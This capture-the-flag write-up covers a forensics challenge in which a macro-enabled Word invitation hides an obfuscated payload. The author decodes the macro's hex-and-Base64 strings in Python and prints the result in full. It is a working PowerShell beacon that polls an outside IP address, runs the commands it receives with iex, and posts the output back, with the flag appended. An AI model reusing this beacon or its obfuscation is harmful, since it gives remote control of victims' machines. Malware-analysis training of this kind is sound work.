# Halloween Invitation
easy | forensics | 200pts

>An email notification pops up. It's from your theater group. Someone decided to throw a party. The invitation looks awesome, but there is something suspicious about this document. Maybe you should take a look before you rent your banana costume.

## First Impressions

The challenge comes with a Word document, `invitation.docm`. A docm file is a Word Document with macros, a script that is executed when the file is opened.

A notification pops up asking to enable or disable macros on opening the file. Since there was no warning about the macros being harmful in the description (like [POOF](forensics-poof.md)), I chose to enable it. It didn't work as I got an error, and the following invitation appears.

![](images/fhi-invite.png)

We can further analyze the macro by clicking on Tools > Macro > Visual Basic Editor to view the source code.

## Macro Analysis

![](images/fhi-macro.png)

The code has two public functions, AutoOpen and Imavedb and a bunch of private functions whose names look like gibberish. Since the gibberish text wasn't helping, I set breakpoints in the code and started debugging to figure out what's happening.

One thing to keep in mind is all the strings here seem obfuscated as hex values, which makes this all the more confusing.

In a nutshell, the code opens a file called `history.bak` and writes some data to it. All of the data is mentioned in one function, ``

![](images/fhi-hex.png)

Each string is first converted from hex to ASCII. The ASCII letters create a Base64 encoded string, so the string is decoded to get the original string.

## Solution

I was unable to get the entire output during debugging, so I took the code to Python and changed the syntax to perform the same functions.

```python
from pwn import *

fxnrfzsdxmcvranp = ""
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("373420363520363620313232203635203638203438203635203734203131392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("36352031323020363520363820313037203635203739203635203635203131372036352036382038352036352037372031303320363520353420363520363820313033203635203737203635203635203532")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("363520363820363520363520373420313139203635203535203635203637203831203635203937203831203635203537203635203637203939203635203930203635203635203438203635203638203737")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("363520383920313033203636203130362036352037312037372036352037382031303320363620313037203635203637203438203635203737203635203635203438203635203638203737203635203930")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("31303320363520313231203635203638203831203635203737203635203635203533203635203637203438203635203738203131392036362031303820363520373120363920363520373720313033203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3132322036352037312036392036352037372031303320363620313036203635203637203939203635203739203131392036352031303720363520373220363520363520383020383120363520313130203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("37312031303320363520313030203635203636203438203635203732203635203635203739203130332036352031313820363520363720353620363520373420313139203635203535203635203637203831")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3635203130302031303320363520353720363520363920313037203635203938203130332036362035302036352037312035362036352039372031313920363620313038203635203637203438203635203835")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("31303320363620313038203635203732203737203635203130302036352036362037382036352037312038352036352031303020363520363620313131203635203731203536203635203930203635203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("31303320363520363720343820363520383620383120363620313232203635203731203835203635203831203130332036362031303420363520373220373720363520393720383120363620313036203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3730203635203635203839203831203636203132312036352037322037372036352039372038312036362031313720363520373120393920363520373320363520363520313136203635203730203835203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("39392031303320363620313132203635203637203635203635203734203635203636203131392036352036372038312036352039392031313920363520313138203635203731203831203635203738203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("36352031323220363520373120373320363520383920313139203636203130362036352036382038392036352039302036352036352031303320363520363720343820363520383320363520363620313038")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3635203731203639203635203930203635203636203130382036352037322037332036352039392031313920363520313033203635203639203635203635203130312031313920363520313035203635203639")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("36392036352031303020383120363620343820363520373120313033203635203938203131392036362031323120363520373120313037203635203130312031303320363620313034203635203732203831")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("363520393720383120363620313138203635203731203532203635203733203130332036352035372036352036372038312036352039372038312036362035372036352036382031313520363520313030")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3131392036362031313120363520373120313037203635203938203635203636203130382036352036372036352036352037352036352036352031303720363520373220383120363520393920313033203636")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3439203635203731203835203635203735203831203636203535203635203637203831203635203839203131392036352035372036352036372031303320363520383320383120363620313137203635203732")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3839203635203938203131392036362031313420363520373120383520363520373620383120363620383320363520373120383520363520393920313139203636203438203635203639203438203635203930")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3831203636203438203635203731203130332036352039382031313920363620313037203635203637203635203635203736203831203636203836203635203732203737203635203930203831203636203637")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("36352037312036392036352039392031313920363620313132203635203731203737203635203835203635203636203130342036352037322037332036352039392031313920363620313132203635203731")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("35322036352039302031313920363520313033203635203637203438203635203836203831203636203132312036352037312031303720363520373320363520363520313037203635203732203635203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3734203635203636203132322036352036372035362036352037372036352036352034382036352036382037372036352039302031303320363520313231203635203638203831203635203737203635203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3533203635203637203635203635203736203831203636203733203635203731203835203635203839203831203636203130372036352037312038352036352039392031303320363620313232203635203637")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("363520363520383120363520363620353520363520363720373320363520383120383120363620343920363520373220383120363520393720363520363620313138203635203732203733203635203937")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("383120363620353420363520373120363920363520313030203635203636203131322036352037312035362036352039382031303320363520313035203635203638203438203635203734203635203636")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3131322036352037322034382036352037352038312036352035352036352037312031303720363520393020313033203635203130332036352036372031303320363520373420363520363620313036203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("363720363520363520373620383120363620313137203635203731203835203635203733203635203635203131302036352036392035322036352039382031313920363620313137203635203731203835")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("363520373420313139203635203131322036352036372036352036352031303120313139203635203130372036352037322037332036352038302038312036362031313220363520373120383520363520313031")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("36352036352031303320363520363720383120363520383920313139203635203130332036352036372034382036352038322038312036362031323120363520373220373320363520393820313139203636")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3132312036352036392036392036352038392031313920363620343820363520373120313037203635203938203131392036362031313720363520363720363520363520383520313139203636203438203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("373120353620363520393920363520363520313033203635203637203438203635203832203831203636203132312036352037322037332036352039382031313920363620313231203635203730203839")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("36352038392038312036362031323120363520373120313037203635203839203831203636203130352036352037312031313920363520393020383120363520313033203635203731203835203635203739")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("31313920363520313037203635203732203733203635203830203831203636203830203635203732203835203635203130302036352036352031313620363520373020373720363520313030203635203636")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("313231203635203731203130372036352039382031303320363620313130203635203637203635203635203736203831203636203734203635203731203532203635203939203635203636203439203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("37322038312036352038342031313920363620313035203635203731203131312036352039302038312036362031303620363520373220383120363520373320363520363520313037203635203732203733")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3635203739203131392036352031303720363520373220383120363520383020383120363620373420363520373120353220363520313030203130332036362031313820363520373120313135203635203930")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("383120363520313136203635203730203733203635203930203831203636203132322036352037322038312036352038342038312036362031303820363520373220383120363520393720363520363620313138")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("363520373120383120363520373320363520363520313136203635203730203835203635203939203130332036362031313220363520363720363520363520373420363520363620313139203635203637")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("38312036352039392031313920363520313138203635203638203939203635203930203831203636203130342036352036382037332036352037372031313920363620313034203635203638203733203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("383920313139203635203130332036352036372034382036352038342038312036362031303820363520373220383120363520393720363520363620313138203635203731203831203635203733203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("36362038312036352036392035362036352038352031313920363620383520363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("37312038352036352039392031303320363620313232203635203637203635203635203831203635203636203535203635203637203733203635203831203831203636203439203635203732203831203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("393720363520363620313138203635203732203733203635203937203831203636203534203635203731203639203635203130302036352036362031313220363520373120353620363520393820313033")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("36352031303520363520363820343820363520373420363520363620313132203635203732203438203635203733203635203635203131362036352036392037332036352039382031313920363620313037")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3635203732203130372036352037332036352036352031313120363520373020313135203635203835203131392036362035332036352037322037372036352031303020363520363620313038203635203731")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3438203635203736203130332036362038352036352037312038352036352031303120363520363620343820363520363720353220363520383220383120363620313137203635203731203737203635203938")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3131392036362031303720363520373120313037203635203938203130332036362031313020363520373020343820363520373920313033203635203534203635203730203835203635203836203635203636")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3731203635203638203130332036352037362031303320363620373220363520373120383520363520313030203635203636203637203635203732203130372036352031303020363520363620313038203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("373220373720363520373520363520363520313037203635203731203835203635203735203131392036352031303720363520373220373320363520373520383120363520313033203635203637203438")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("363520393720313033203636203131382036352037312031303720363520393820313033203635203130332036352036372039392036352037332036352036352031313020363520363720313037203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("31303220383120363520313033203635203732203737203635203938203635203636203130382036352037312038352036352039392036352036352031303320363520363820363520363520373620313033")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3635203532203635203732203438203635203833203635203636203835203635203639203733203635203130312031313920363520343920363520373220383520363520393920363520363520313232203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("37322037332036352038382031313920363520313232203635203638203831203635203738203831203636203533203635203730203536203635203938203831203635203438203635203731203737203635")).decode('utf-8').split(" ")])
fxnrfzsdxmcvranp += "".join([chr(int(i)) for i in (unhex("3939203130332036352031313920363520363820383520363520313032203831203635203631")).decode('utf-8').split(" ")])

print(b64d(fxnrfzsdxmcvranp).replace(b'\x00', b''))
```

The flag is mentioned at the very end of the resulting string,

```txt
$ python3 invitation-sol.py
b'$s=\'77.74.198.52:8080\';$i=\'d43bcc6d-043f2409-7ea23a2c\';$p=\'http://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{"Authorization"=$i});if ($c -ne \'None\') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep 0.8}HTB{5up3r_345y_m4cr05}'
```

Flag: `HTB{5up3r_345y_m4cr05}`